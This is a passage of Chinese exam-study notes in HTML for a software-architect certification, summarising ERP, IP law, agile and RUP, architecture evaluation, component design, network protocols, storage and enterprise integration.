设备管理：对设备寿命周期内的所有设备物资运动形态和价值运动形态进行综合管理。</li><li><strong>（10）财务管理</strong>：以货币形式反映和监督企业日常经济活动，为企业管理和决策提供必要的信息支持。</li><li><strong>（11）ERP有关扩展应用模块</strong>：如客户关系管理（CRM）、分销资源管理、供应链管理、电子商务等。</li></ul><blockquote><p>其中，（3）（4）（5）（6）（7）又称作是<strong>ERP的五层计划</strong>。</p></blockquote><h3 id="CRM（客户关系管理系统）的定位（P68）"><a href="#CRM（客户关系管理系统）的定位（P68）" class="headerlink" title="CRM（客户关系管理系统）的定位（P68）"></a>CRM（客户关系管理系统）的定位（P68）</h3><p>在注重提高客户满意度的同时，一定要把帮助企业提高<strong>获取利润的能力</strong>作为重要指标。</p><h3 id="企业门户分类（P74）"><a href="#企业门户分类（P74）" class="headerlink" title="企业门户分类（P74）"></a>企业门户分类（P74）</h3><ul><li>企业信息门户：强调为访问结构数据和无结构数据提供一个统一的入口</li><li>企业知识门户：强调提高企业范围内的知识共享，减少员工解决问题时间，提高工作效率</li><li>企业应用门户：提高企业集中贸易能力、协同能力和信息管理能力的平台</li><li>垂直门户：为某一特定的行业服务的，传送的信息值属于人们感兴趣的领域。</li></ul><h3 id="知识产权的相关法律法规（P88）"><a href="#知识产权的相关法律法规（P88）" class="headerlink" title="知识产权的相关法律法规（P88）"></a>知识产权的相关法律法规（P88）</h3><p>软件著作权的产生时间，是自软件开发完成之日时。</p><p>软件商标权的保护对象是软件注册商标。</p><p>为介绍、评论某一作品或者说明某一问题，在作品中<strong>适当</strong>引用他人<strong>已发表</strong>的作品，可以不经著作权人许可，不向其支付报酬。</p><p>法律法规，国家机关决议、决定、命令和其他具有立法、行政、司法性质的文件，及其官方译文均不适用或不受著作权法保护。</p><p>口述作品（如某人在公共场所的即兴演说）适用于著作权法，并受其保护。</p><p>著作权权利中，署名权、修改权、保护作品完整权的保护期不受时间限制，发表权的保护期限为作者终生及其死亡后五十年（截止于作者死亡后第五十年的12月31日）。</p><p>通过反向编译技术、净室技术、反向工程技术等获得他人<strong>软件技术构思、技术方案</strong>并直接用于其自身软件产品的行为，在我国暂无相关法律法规限制，在著作权法中不构成侵权（<strong>著作权法也不保护思想</strong>）。</p><p>商业秘密要受到法律保护，必须同时满足三个条件：不为公众所知悉、具有实用性、采取了保密措施。缺少任意一个均会丧失法律保护。</p><p>公司享有 <strong>[员工任职期间利用公司资源所开发的软件]</strong> 的著作权，不论是否和该员工签订了劳动合同。</p><p>专利法规定，申请专利的发明创造在 <strong>[申请日以前6个月内]</strong> ，有下列情形之一的不丧失新颖性：① 在中国政府主办或者承认的国际展览会上首次展出的；② 在规定的学术会议或者技术会议上首次发表的； ③ 他人未经申请人同意而泄露其内容的。</p><p>知识产权的保护以所执行国家的当地法律为准，不受被保护对象的身份国籍影响。</p><h3 id="敏捷开发的核心思想-特点-（P98）"><a href="#敏捷开发的核心思想-特点-（P98）" class="headerlink" title="敏捷开发的核心思想 / 特点 （P98）"></a>敏捷开发的核心思想 / 特点 （P98）</h3><ul><li>适应型而非预测型，拥抱变化</li><li>以人为本而非以过程为本，强调充分发挥人的特性</li><li>迭代增量式开发，以原型开发为核心，发行版本小型化</li></ul><h3 id="敏捷开发核心价值观（P99）"><a href="#敏捷开发核心价值观（P99）" class="headerlink" title="敏捷开发核心价值观（P99）"></a>敏捷开发核心价值观（P99）</h3><p>沟通、简单、反馈、勇气</p><h3 id="敏捷开发实践规则（P99）"><a href="#敏捷开发实践规则（P99）" class="headerlink" title="敏捷开发实践规则（P99）"></a>敏捷开发实践规则（P99）</h3><p>简单设计，测试驱动，代码重构，结对编程，持续集成，现场客户，发行版本小型化，系统隐喻，代码集体所有制，规划策略，规范代码，40小时工作制</p><h3 id="极限编程（XP）的13个核心实践（P99）"><a href="#极限编程（XP）的13个核心实践（P99）" class="headerlink" title="极限编程（XP）的13个核心实践（P99）"></a>极限编程（XP）的13个核心实践（P99）</h3><p>团队协作、规划策略、结对编程、测试驱动开发、重构、简单设计、代码集体所有权、持续集成、客户测试、每周40小时工作制、编码规范、系统隐喻、小型发布</p><h3 id="RUP（统一软件开发过程）阶段任务（P101）"><a href="#RUP（统一软件开发过程）阶段任务（P101）" class="headerlink" title="RUP（统一软件开发过程）阶段任务（P101）"></a>RUP（统一软件开发过程）阶段任务（P101）</h3><ul><li>初始：定义最终产品视图和业务模型，并确定系统范围。</li><li>细化：设计及确定系统的体系结构，指定工作计划及资源要求。</li><li>构造：构造产品并继续演进需求、体系结构，计划直至产品移交。</li><li>移交：把产品提交给用户使用。</li></ul><p>每个阶段都由一个或多个迭代组成，迭代并非重复地做相同的事，而是针对不同用例的细化和实现。每一个迭代都是一个完整的开发过程（<strong>螺旋模型</strong>）。</p><h3 id="项目管理工具（P108）"><a href="#项目管理工具（P108）" class="headerlink" title="项目管理工具（P108）"></a>项目管理工具（P108）</h3><p>项目管理工具（如<strong>成本估算工具</strong>）用来辅助软件的项目管理活动。它通常把重点放在一个或某几个特定的管理环节上，而<strong>不提供</strong>对管理活动包罗万象的支持。</p><h3 id="需求管理（P109）"><a href="#需求管理（P109）" class="headerlink" title="需求管理（P109）"></a>需求管理（P109）</h3><p>需求管理是一个对系统需求变更、了解和控制的过程。</p><p><strong>原则（策略）</strong>：</p><ul><li>需求管理的关键领域<strong>不涉及</strong>收集和分析项目需求</li><li>开发人员在向客户以及有关部门承诺某些需求之前，应该确认需求和约束条件、风险、偶然因素、假定条件等。<strong>绝不承诺任务无法实现之事</strong>。</li><li>关键处理领域同样建议通过<strong>版本控制和变更控制</strong>来管理需求文档。</li></ul><h3 id="需求变更策略（P112）"><a href="#需求变更策略（P112）" class="headerlink" title="需求变更策略（P112）"></a>需求变更策略（P112）</h3><ul><li>所有需求变更必须遵循变更控制过程。</li><li>对于未获批准的变更，不应该做设计和实现工作。</li><li>变更应该由项目变更控制委员会决定实现哪些变更。</li><li>项目风险承担者应该能够了解变更数据库的内容。</li><li>决不能从数据库中删除或修改变更请求的原始文档。</li><li>每一个集成的需求变更必须能够跟踪到一个经核准的变更请求。</li></ul><h3 id="项目范围定义（P116）"><a href="#项目范围定义（P116）" class="headerlink" title="项目范围定义（P116）"></a>项目范围定义（P116）</h3><p>项目章程、项目范围管理计划、组织过程资产、批准的变更申请</p><h3 id="项目时间管理（P116）"><a href="#项目时间管理（P116）" class="headerlink" title="项目时间管理（P116）"></a>项目时间管理（P116）</h3><p>项目时间管理的过程包括：活动定义、活动排序、活动的资源估算、活动的历时估算、制定进度计划、进度控制。</p><p>为了得到<strong>工作分解结构（WBS）</strong>中最底层的交付物，必须执行一系列的活动，对这些活动的识别以及归档的过程就叫做活动定义。</p><h3 id="产品配置的配置项（P117）"><a href="#产品配置的配置项（P117）" class="headerlink" title="产品配置的配置项（P117）"></a>产品配置的配置项（P117）</h3><ul><li>属于产品组成部分的工作成果：需求文档、设计文档、源代码、测试用例等。</li><li>属于项目管理和机构支撑过程域产生的文档：工作计划、项目质量报告、项目跟踪报告等。</li></ul><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>在不执行程序的情况下，对其进行分析的技术。</p><p>其<strong>特点</strong>为：不实际执行程序，分析速度快、效率高，误报率较高。</p><p>相较之下的<strong>动态分析</strong>则需实际执行程序，多用于性能测试、功能测试、内存测试等。</p><h3 id="静态分析技术"><a href="#静态分析技术" class="headerlink" title="静态分析技术"></a>静态分析技术</h3><ul><li><strong>词法分析</strong>：逐字符读入源程序，使用正则匹配转换为等价符号流，生成相关符号列表。</li><li><strong>语法分析</strong>：判断源程序结构上是否正确，通过上下文无关语法将相关符号整理为语法树。</li><li><strong>抽象语法树分析</strong>：将程序组织成树形结构，树中相关节点代表程序中的相关代码。</li><li><strong>语义分析</strong>：对结构上正确的源程序进行上下文有关的性质检查。</li><li><strong>控制流分析</strong>：生成有向控制流图，用节点代表基本代码块，节点间的有向边代表控制流路径，反向边表示可能存在的循环，还可生成函数调用关系图，表示函数间的嵌套关系。</li><li><strong>数据流分析</strong>：对控制流图遍历，记录变量的初始化点和引用点，保存切片相关数据信息。</li><li><strong>污点分析</strong>：基于数据流图判断代码中哪些变量可能受到攻击，是验证输入、识别代码表达缺陷的关键。</li><li><strong>无效代码分析</strong>：根据控制流图可分析孤立节点就是无效代码。</li></ul><h3 id="遗留系统的演化策略"><a href="#遗留系统的演化策略" class="headerlink" title="遗留系统的演化策略"></a>遗留系统的演化策略</h3><p>淘汰、改造、继承、集成</p><h3 id="逆向工程导出信息级别（P123）"><a href="#逆向工程导出信息级别（P123）" class="headerlink" title="逆向工程导出信息级别（P123）"></a>逆向工程导出信息级别（P123）</h3><ul><li>实现级：包括程序的抽象语法树、符号表等信息</li><li>结构级：包括反映程序分量之间相互依赖关系的信息，如调用图、结构图。</li><li>功能级：包括反映程序段功能及程序段之间关系的信息。</li><li>领域级：包括反映程序分量或程序诸实体与应用领域概念之间对应关系的信息。</li></ul><h3 id="软件架构设计的生命周期（P125）"><a href="#软件架构设计的生命周期（P125）" class="headerlink" title="软件架构设计的生命周期（P125）"></a>软件架构设计的生命周期（P125）</h3><ul><li>需求<strong>分析</strong>阶段：关注<strong>问题域</strong></li><li>软件<strong>设计</strong>阶段：将需求转换为<strong>软件架构模型</strong></li><li>软件<strong>实现</strong>阶段：关注将架构设计转换为<strong>实际代码</strong></li><li>软件<strong>部署</strong>阶段：通过组装软件组件提高系统的<strong>实现效率</strong></li></ul><p>其中在设计和实现阶段对软件架构的关注度最大，软件系统架构必须建立在需求明确的基础上。</p><h3 id="架构模式、设计模式、惯用法的区别"><a href="#架构模式、设计模式、惯用法的区别" class="headerlink" title="架构模式、设计模式、惯用法的区别"></a>架构模式、设计模式、惯用法的区别</h3><p>架构模式是软件设计中的高层决策，反映了开发软件系统过程中所作的基本设计决策。</p><p>设计模式主要关注软件系统的设计，与具体的实现语言无关。</p><p>惯用法是实现时通过某种特定的程序设计语言来描述构件与构件之间的关系。</p><h3 id="软件架构的主要作用（P127）"><a href="#软件架构的主要作用（P127）" class="headerlink" title="软件架构的主要作用（P127）"></a>软件架构的主要作用（P127）</h3><p>分析设计在满足规定需求方面的有效性。</p><p>在设计变更相对容易的阶段，考虑体系结构可能选择的方案。</p><p>降低与软件构造相关联的风险。</p><h3 id="软件架构策略"><a href="#软件架构策略" class="headerlink" title="软件架构策略"></a>软件架构策略</h3><table><thead><tr><th align="left">关键</th><th align="left">问题</th><th align="left">危害</th><th align="left">策略</th><th align="left">要点</th></tr></thead><tbody><tr><td align="left">是否遗留了至关重要的非功能需求</td><td align="left">对需求理解不系统、不全面，对非功能需求不够重视</td><td align="left">造成返工、项目失败</td><td align="left"><font color="red"><strong>全面认识需求</strong></font></td><td align="left">从不同级别、不同类别梳理列表，归纳总结，建立跟踪矩阵</td></tr><tr><td align="left">能否驯服数量巨大且频繁变化的需求</td><td align="left">对于时间和质量的矛盾，办理不足，处理草率</td><td align="left">耗时不少、质量不高</td><td align="left">让关键需求决定架构：只分析和重点关注关键功能性需求和重要的质量属性需求</td><td align="left">控制架构设计时需详细分析用例的个数，权衡非功能需求之间的关系，找到影响架构的重点非功能需求</td></tr><tr><td align="left">能否从容地设计软件架构的不同方面</td><td align="left">架构设计方案覆盖范围严重不足，许多关键决定被延迟由实现人员仓促决定</td><td align="left">开发混乱、质量不高</td><td align="left">多立场、多视角探寻架构：架构级设计是分层式的分而治之，子系统是功能性分而治之</td><td align="left">一次只从某一主场、某一视角出发，围绕少数概念和技术展开，并分析对其他部分、其他立场视角分析结果的关系与影响</td></tr><tr><td align="left">是否及早验证架构方案并作出调整</td><td align="left">假设架构方案是可行的，直到后期才能发现问题，造成大规模返工</td><td align="left">造成返工、项目失败</td><td align="left">尽早验证架构：采用原型技术和框架技术</td><td align="left">必须精挑细选能够触发主要设计决策参与执行的、或有较高技术风险的、或最影响用户满意度的一切功能进行验证</td></tr></tbody></table><br><table><thead><tr><th align="left"><font color="red"><strong>全面认识需求</strong></font></th><th align="left">功能需求</th><th align="left">质量属性</th><th align="left">约束</th></tr></thead><tbody><tr><td align="left">组织级</td><td align="left">软件系统实现的功能</td><td align="left">-</td><td align="left">成本、上线时间、业务限制</td></tr><tr><td align="left">用户级</td><td align="left">软件系统实现的功能</td><td align="left">易用性、性能、持续可用性、可靠性</td><td align="left">用户的计算机水平有限</td></tr><tr><td align="left">开发级</td><td align="left">软件系统实现的功能</td><td align="left">可扩展性、可重用性、可移植性、易理解性、易测试性</td><td align="left">开发语言的约束</td></tr></tbody></table><h3 id="体系结构失配（P128）"><a href="#体系结构失配（P128）" class="headerlink" title="体系结构失配（P128）"></a>体系结构失配（P128）</h3><ul><li>由构件引起的失配：包括系统对构件基础设施、构件控制模型和构件数据模型的假设存在冲突。</li><li>由连接子引起的失配：包括系统对构件交互协议、连接子数据模型的假设存在冲突。</li><li>由于系统成分对全局体系结构的假设存在冲突引起的失配。</li></ul><h3 id="软件架构的重要性（P130）"><a href="#软件架构的重要性（P130）" class="headerlink" title="软件架构的重要性（P130）"></a>软件架构的重要性（P130）</h3><ul><li>能满足系统的品质</li><li>使受益人达成一致的目标</li><li>能够支持计划编制过程</li><li>对系统开发的指导性</li><li>能够有效管理复杂性</li><li>为复用奠定了基础</li><li>能够降低维护费用</li><li>能够支持冲突分析</li></ul><h3 id="DSSA特定领域架构的角色与任务（P145）"><a href="#DSSA特定领域架构的角色与任务（P145）" class="headerlink" title="DSSA特定领域架构的角色与任务（P145）"></a>DSSA特定领域架构的角色与任务（P145）</h3><table><thead><tr><th align="left">角色</th><th align="left">任务</th></tr></thead><tbody><tr><td align="left">领域专家（软件工程师）</td><td align="left">提供关于领域中系统的需求规约和实现的知识，帮助组织规范的、一致的领域字典，帮助选择样本系统作为领域工程的依据，复审领域模型、DSSA等领域工程产品等</td></tr><tr><td align="left">领域分析者（系统分析员）</td><td align="left">控制整个领域分析过程，进行知识的获取、将获取的知识组织到领域模型中，根据现有系统、标准规范等验证领域模型的准确性和一致性，维护领域模型</td></tr><tr><td align="left">领域设计者（软件设计人员）</td><td align="left">控制整个软件设计过程，根据领域模型和现有的系统开发出DSSA，对DSSA的准确性和一致性进行验证，建立领域模型和DSSA之间的关系</td></tr><tr><td align="left">领域实现者（程序设计人员）</td><td align="left">根据领域模型和DSSA，或者重头开发可重用构件、或者利用再工程的技术从现有系统中提取可重用构件，对可重用构件进行验证，建立DSSA与可重用构件之间的联系</td></tr></tbody></table><h3 id="ATAM体系架构权衡分析方法（P152）"><a href="#ATAM体系架构权衡分析方法（P152）" class="headerlink" title="ATAM体系架构权衡分析方法（P152）"></a>ATAM体系架构权衡分析方法（P152）</h3><p>主要关注系统的 <strong>[需求建模]</strong> ， 并在系统开发之前，针对 <strong>[性能、实用性、安全性和可修改性]</strong> 等质量属性进行评价和折中。</p><p>ATAM不是精确的评估工具，其整个评估过程强调以 <strong>[质量属性]</strong> 作为架构评估的核心概念。</p><p>在识别出质量属性的描述后，通常采用 <strong>[决策表]</strong> 对质量属性的描述进行刻画与排序。</p><p>ATAM分为4个主要的 <strong>[活动领域]</strong> ，包括需求收集、体系结构视图描述、属性模型构造和分析、折中。</p><h3 id="软件设计阶段的度量"><a href="#软件设计阶段的度量" class="headerlink" title="软件设计阶段的度量"></a>软件设计阶段的度量</h3><ul><li>架构层次度量：考虑了设计模型的体系结构方面</li><li>构件层次度量：通过建立内聚、耦合和复杂度的简介度量，提供了模块质量的指示</li><li>界面层次度量：给GUI的布局提供了恰当性的提示</li></ul><h3 id="耦合程度"><a href="#耦合程度" class="headerlink" title="耦合程度"></a>耦合程度</h3><p>从低到高排列如下（越低越好）：</p><ul><li>非直接耦合：两个模块间无直接联系，他们之间的联系完全是通过主模块的控制和调度实现的。</li><li>数据耦合：一个模块访问另一个模块时，彼此之间是通过简单数据参数来交换输入输出信息的。</li><li>标记耦合：一组模块通过参数表传递记录信息。这个记录是某一数据结构，而非简单变量。</li><li>控制耦合：一个模块通过传送开关、标识等控制信息，明显选择另一模块的内部功能。</li><li>外部耦合：一组模块通过访问同一全局简单变量（而非参数表或全局数据结构）来传递信息。</li><li>公共耦合：一组模块通过访问同一公共环境数据（而非全局简单变量）来传递信息。</li><li>内容耦合：一个模块直接修改或操作另一模块的数据，或者不通过正常入口转入另一模块。</li></ul><h3 id="文档评审"><a href="#文档评审" class="headerlink" title="文档评审"></a>文档评审</h3><ul><li><strong>需求评审</strong>：进一步确认开发者和设计者已了解的用户要求、以及用户从开发者了解的某些限制和约束</li><li><strong>设计评审</strong>：产生的最终文档规定系统和程序如何设计开发和测试，以满足统一的需求规格说明书</li><li><strong>概要设计评审</strong>：评审每个系统组成部分的基本设计方法和<strong>集成测试计划</strong>，并相应修改系统规格说明书</li><li><strong>详细设计评审</strong>：主要评审计算机程序、程序单元测试计划</li></ul><h3 id="形式化方法"><a href="#形式化方法" class="headerlink" title="形式化方法"></a>形式化方法</h3><ul><li><strong>数据不变式</strong>：即一个条件表达式，它在包含一组数据的系统的执行过程中总保持为真。</li><li><strong>状态</strong>：即从系统外部能够观察到的行为模式的一种表示（或者系统访问和修改的存储数据）</li><li><strong>操作</strong>：即系统中发生的动作，以及对状态数据的读写。每一个操作均与前置条件和后置条件相关。</li></ul><h3 id="用例图-用例间关系（P159）"><a href="#用例图-用例间关系（P159）" class="headerlink" title="用例图-用例间关系（P159）"></a>用例图-用例间关系（P159）</h3><ul><li><strong>泛化</strong>：</li><li><strong>包含</strong>：特殊的依赖关系，一个用例（称作基本用例）包含了另一个用例（称作包含用例）的行为。</li><li><strong>扩展</strong>：类似于泛化关系，但有更多规则限制。扩展用例只能在基本用例的扩展点上增加新的行为。</li></ul><h3 id="UML面向对象设计（P176）"><a href="#UML面向对象设计（P176）" class="headerlink" title="UML面向对象设计（P176）"></a>UML面向对象设计（P176）</h3><ul><li><strong>边界类</strong>：实现界面控制、外部接口和环境隔离。</li><li><strong>实体类</strong>：表示目标软件系统中具有持久意义的信息项及其操作。</li><li><strong>控制类</strong>：作为完成用例任务的责任承担者，协调、控制其他类共同完成用例规定的功能或行为。</li></ul><h3 id="软件构件概念（P247）"><a href="#软件构件概念（P247）" class="headerlink" title="软件构件概念（P247）"></a>软件构件概念（P247）</h3><p>软件构件是软件系统中具有一定意义的、相对独立的可重用单元。构件可以基于对象实现、也可以不基于对象实现。构件需要在容器中管理并获取容器提供的服务。客户程序可以在运行状态下利用接口动态确定构件所支持的功能并调用。</p><h3 id="构件设计原则"><a href="#构件设计原则" class="headerlink" title="构件设计原则"></a>构件设计原则</h3><ul><li><strong>开关原则</strong>：模块应对外延具有开放性，对修改具有封闭性</li><li><strong>Liskov替换原则</strong>：子类可以替换它们的基类</li><li><strong>依赖倒置原则</strong>：依赖于抽象，而非具体实现</li><li><strong>接口分离原则</strong>：多个用户专用接口比一个通用接口要好</li></ul><h3 id="构件依赖关系"><a href="#构件依赖关系" class="headerlink" title="构件依赖关系"></a>构件依赖关系</h3><ul><li><strong>共享依赖</strong>：使用相同资源的 <strong>[消费者间]</strong> 或 <strong>[生产者间]</strong> 的依赖</li><li><strong>流依赖</strong>： <strong>[生产者和消费者间]</strong> 的资源依赖</li><li><strong>约束依赖</strong>：一组 <strong>[活动间]</strong> 的相关控制流上的约束</li></ul><h3 id="基于构件开发模型的顺序执行阶段"><a href="#基于构件开发模型的顺序执行阶段" class="headerlink" title="基于构件开发模型的顺序执行阶段"></a>基于构件开发模型的顺序执行阶段</h3><p>需求分析定义、体系结构设计、构件库建立、应用软件创建、测试和发布</p><h3 id="基于构件的软件工程的复用性计划"><a href="#基于构件的软件工程的复用性计划" class="headerlink" title="基于构件的软件工程的复用性计划"></a>基于构件的软件工程的复用性计划</h3><ul><li><strong>成品构件</strong>：从第三方获得，或在以前项目中已进行内部开发的既有软件。成品构件能够直接应用于当前项目。</li><li><strong>具有完全经验的构件</strong>：以前项目开发的构件，与当前项目需要构造的软件具有一定相似性。对其修改的风险较小，要求团队成员在这些构件所代表的领域中具有丰富的经验。</li><li><strong>具有部分经验的构件</strong>：以前项目开发的构件，与当前项目需要构造的软件具有一定相似性。由于团队成员在这些构件所代表的领域中的经验较少，若对其做实质性的修改，会有较大风险。</li><li><strong>新构件</strong>：软件团队为了满足当前项目的特定需求，而必须专门开发的软件构件。</li></ul><h3 id="加密解密技术（P307）"><a href="#加密解密技术（P307）" class="headerlink" title="加密解密技术（P307）"></a>加密解密技术（P307）</h3><ul><li><strong>对称算法</strong>：DES（便于硬件不便于软件实现），RC-5，IDEA</li><li><strong>非对称算法</strong>：RSA，ECC</li><li><strong>摘要算法（不可逆）</strong>：MD5，MD4，SHA，HMAC</li></ul><h3 id="网络七层协议（P317）"><a href="#网络七层协议（P317）" class="headerlink" title="网络七层协议（P317）"></a>网络七层协议（P317）</h3><table><thead><tr><th align="center">网络层</th><th align="center">相关协议</th></tr></thead><tbody><tr><td align="center">应用层</td><td align="center"><font color="red">DHCP、DNS、FTP</font>、Gopher、<font color="red">HTTP、HTTPS</font>、IMAP4、IRC、NNTP、XMPP、<br><font color="red">POP3</font>、SIP、<font color="red">SMTP、SNMP、SSH、TELNET</font>、RPC、RTCP、RTP、<br>RTSP、SDP、<font color="red">SOAP</font>、GTP、STUN、NTP、SSDP、<font color="red">NFS（网络文件系统）</font></td></tr><tr><td align="center">表示层</td><td align="center">HTTP/HTML、FTP、Telnet、ASN.1（具有表示层功能）</td></tr><tr><td align="center">会话层</td><td align="center">ADSP、ASP、H.245、ISO-SP、iSNS、NetBIOS、RPC、<br>RTCP、SMPP、SCP、SSH、ZIP、SDP（具有会话层功能）</td></tr><tr><td align="center">传输层</td><td align="center"><font color="red">TCP、UDP</font>、TLS、DCCP、SCTP、RSVP、PPTP</td></tr><tr><td align="center">网络层</td><td align="center"><font color="red">IP (IPv4、IPv6)</font>、ICMP、ICMPv6、IGMP、IS-IS、<font color="red">IPsec</font>、BGP、RIP、OSPF、ARP、RARP</td></tr><tr><td align="center">数据链路层</td><td align="center"><font color="red">L2TP（第2层隧道协议）、PAP（密码认证协议）</font>、<br>Wi-Fi(IEEE 802.11)、WiMAX(IEEE 802.16)、ATM、DTM、令牌环、以太网路、<br>FDDI、帧中继、GPRS、EVDO、HSPA、HDLC、PPP、ISDN、STP</td></tr><tr><td align="center">物理层</td><td align="center">RS-232、RS-449、X.21、V.35、ISDN、FDDI、IEEE802.3、IEEE802.4、IEEE802.5、<br>以太网路卡、调制解调器、电力线通信(PLC)、SONET/SDH（光同步数字传输网）、<br>G.709（光传输网络）、光导纤维、同轴电缆、双绞线</td></tr></tbody></table><h3 id="Internet三种服务质量类型"><a href="#Internet三种服务质量类型" class="headerlink" title="Internet三种服务质量类型"></a>Internet三种服务质量类型</h3><ul><li><strong>保证质量的服务</strong>：对带宽、时延、抖动和丢包率提供定量的保证。</li><li><strong>尽力而为的服务</strong>：这是一般的Internet服务，不保证服务质量</li><li><strong>负载受控的服务</strong>：提供类似于网络欠载时的服务，定性地提供</li></ul><h3 id="网络分层设计模型（三层模型）"><a href="#网络分层设计模型（三层模型）" class="headerlink" title="网络分层设计模型（三层模型）"></a>网络分层设计模型（三层模型）</h3><ul><li><strong>核心层</strong>（网络的高速交换主干）<br>　　是所有流量的最终承受者和汇聚者，其主要功能是实现骨干网络间的优化传输，因此应采用冗余设计，以保证冗余能力、可靠性和高速传输。</li><li><strong>汇聚层</strong>（提供基于策略的连接）<br>　　是核心层与接入层的中介，即在工作站接入前先做好汇聚，以减轻核心层的设备负荷。如过滤数据包、策略路由、完成路由汇总和协议转换功能等。</li><li><strong>接入层</strong>（将工作站接入网络）<br>　　应提供即插即用特性，为用户提供本地网段访问接入能力，主要解决相邻用户互访需求，并应适当负责一些用户管理工作（如地址认证、用户认证、计费管理等），以及用户信息的收集工作（如IP地址、MAC地址、访问日志等）。</li></ul><h3 id="网络开发过程"><a href="#网络开发过程" class="headerlink" title="网络开发过程"></a>网络开发过程</h3><ul><li><strong>需求分析</strong>：理解网络应该具有的功能和性能，最终设计出符合用户需求的网络</li><li><strong>网络体系分析</strong>：分析现有网络和新网络的各类资源分布，掌握网络所处的状态</li><li><strong>网络逻辑设计</strong>：根据需求规范和通信规范，实施资源分配和安全规划</li><li><strong>物理网络设计</strong>：依据逻辑网络设计的功能要求，确定设备的具体物理分布和运行环境</li></ul><h3 id="网络存储方式"><a href="#网络存储方式" class="headerlink" title="网络存储方式"></a>网络存储方式</h3><ul><li><strong>DAS</strong>：开放系统的直连式存储<br>　　在服务器上外挂了一组大容量硬盘，存储设备与服务器之间采用SCSI通道连接。<br>　　这种方式难以扩展存储容量，且不支持数据容错功能，当服务器出现异常时会造成数据丢失。</li><li><strong>NAS</strong>：网络接入存储（公网环境）<br>　　是将存储设备连接到现有的网络上，提供数据存储和文件访问服务的设备。<br>　　NAS服务器是在专用主机上安装简化了的瘦操作系统的文件服务器，它内置了与网络连接所需要的协议，可以直接联网，具有权限的用户都可以通过网络访问NAS服务器上的文件。</li><li><strong>SAN</strong>：存储区域网络（专网环境）<br>　　是一种连接存储设备和存储管理子系统的专用网络，专门提供数据存储和管理功能。<br>　　SAN可以看做是负责数据传输的后端网络，而前端网络（又称数据网络）则负责正常的TCP/IP传输。<br>　　SAN也可以看做是通过特定的互连方式连接的若干台存储服务器组成的单独的数据网络，提供企业级的数据存储服务。</li></ul><h3 id="SNMP-v3（简单网络管理协议）"><a href="#SNMP-v3（简单网络管理协议）" class="headerlink" title="SNMP.v3（简单网络管理协议）"></a>SNMP.v3（简单网络管理协议）</h3><p><strong>必须防护的威胁</strong>：</p><ul><li>（主要）修改信息</li><li>（主要）假冒</li><li>（次要）修改报文流</li><li>（次要）消息泄露</li></ul><p><strong>不必防护的威胁</strong>：</p><ul><li>拒绝服务</li><li>通信分析</li></ul><h3 id="网络架构数据流图的内容"><a href="#网络架构数据流图的内容" class="headerlink" title="网络架构数据流图的内容"></a>网络架构数据流图的内容</h3><p>服务器及其物理位置、客户端及其物理位置、处理器说明、传输协议</p><h3 id="HTTP超文本传输协议"><a href="#HTTP超文本传输协议" class="headerlink" title="HTTP超文本传输协议"></a>HTTP超文本传输协议</h3><p>HTTP是一种基于TCP 80端口在浏览器和web服务器之间传送网页信息的应用层协议。</p><p>TCP是一种面向连接的传输层协议，在数据传输之前需要在发送方和接收方之间建立一对一的连接（单播通信），因此HTTP使用TCP传送页面文件时，每个页面文件都需要单独建立一条TCP连接。</p><h3 id="RIP路由协议"><a href="#RIP路由协议" class="headerlink" title="RIP路由协议"></a>RIP路由协议</h3><p>一种内部网关协议，采用距离向量算法，使用“跳数”来衡量到达目标的路由距离。</p><p>这种协议的路由只关心自己周围的世界，只与自己相邻的路由交换信息，范围限制在15跳以内，再远则不关心了（认为不可达）。</p><p>默认情况下，RIP使用一种非常简单的度量机制：距离就是通往目的站点所经的链路数，取值为1~15，数值16表示无穷大（不可达）。</p><h3 id="系统可维护性评价指标（P397）"><a href="#系统可维护性评价指标（P397）" class="headerlink" title="系统可维护性评价指标（P397）"></a>系统可维护性评价指标（P397）</h3><p>可理解性、可测试性、可修改性</p><h3 id="系统维护工作类型（P397）"><a href="#系统维护工作类型（P397）" class="headerlink" title="系统维护工作类型（P397）"></a>系统维护工作类型（P397）</h3><ul><li><strong>更正性维护</strong>：针对系统内隐藏的错误</li><li><strong>适应性维护</strong>：为了适应软硬件环境变化</li><li><strong>完善性维护</strong>：针对用户的功能扩充需求</li><li><strong>预防性维护</strong>：针对可能会发生的变化或调整先行维护</li></ul><h3 id="计算机质量保证计划规范内容"><a href="#计算机质量保证计划规范内容" class="headerlink" title="计算机质量保证计划规范内容"></a>计算机质量保证计划规范内容</h3><ul><li><strong>验证</strong>：确定软件在开发周期中的一个给定阶段的产品是否达到上一阶段确立的需求的过程</li><li><strong>确认</strong>：在软件开发过程结束时对软件进行评价，以确定它是否和软件需求相一致的过程</li><li><strong>测试</strong>：通过执行程序来有意识地发现程序中的设计错误和编码错误的过程。</li></ul><p>测试是验证和确认的手段之一。</p><h3 id="集成平台的基本功能（P449）"><a href="#集成平台的基本功能（P449）" class="headerlink" title="集成平台的基本功能（P449）"></a>集成平台的基本功能（P449）</h3><ul><li><strong>通信服务</strong><br>　　提供透明的同步/异步通信服务功能（用户和应用无需关心具体的操作系统和网络物理位置）。</li><li><strong>信息集成服务</strong><br>　　实现不同数据库系统间的数据交换、互操作、分布数据管理和共享信息模型定义，使继集成平台运行的应用、服务或用户端能够以一致的语义和接口实现对数据的访问与控制。</li><li><strong>应用集成服务</strong><br>　　能够为应用提供数据交换和访问操作，使各种不同的系统能够相互协作。</li><li><strong>二次开发工具</strong></li><li><strong>平台运行管理工具</strong></li></ul><h3 id="企业集成模式（P451）"><a href="#企业集成模式（P451）" class="headerlink" title="企业集成模式（P451）"></a>企业集成模式（P451）</h3><ul><li><strong>面向信息的集成</strong><br>　　强调实现数据的转换（不同数据格式和存储方式之间的转换）、数据源的统一（同一个数据仅有一个数据入口）、数据的一致性维护、异构环境下不同的应用系统之间的数据传送。</li><li><strong>面向过程的集成</strong><br>　　采用工作流管理方式，强调处理不同应用系统之间的交互逻辑，与核心业务逻辑相分离，并通过不同应用系统之间的协作共同完成某项业务功能。</li><li><strong>面向服务的集成</strong><br>　　强调大范围内的公共业务过程集成的动态继承方式，可以较好实现企业间具有松散耦合关系的不同应用之间的互操作。</li></ul><h3 id="企业应用集成"><a href="#企业应用集成" class="headerlink" title="企业应用集成"></a>企业应用集成</h3><ul><li><strong>数据集成</strong>：提供企业之间的信息共享能力</li><li><strong>API集成</strong>：</li><li><strong>功能集成</strong>：通过重用现有逻辑来实现和提供更强大的功能</li><li><strong>界面集成</strong>：使得用户对集成系统产生一个“整体”的感觉</li></ul><h3 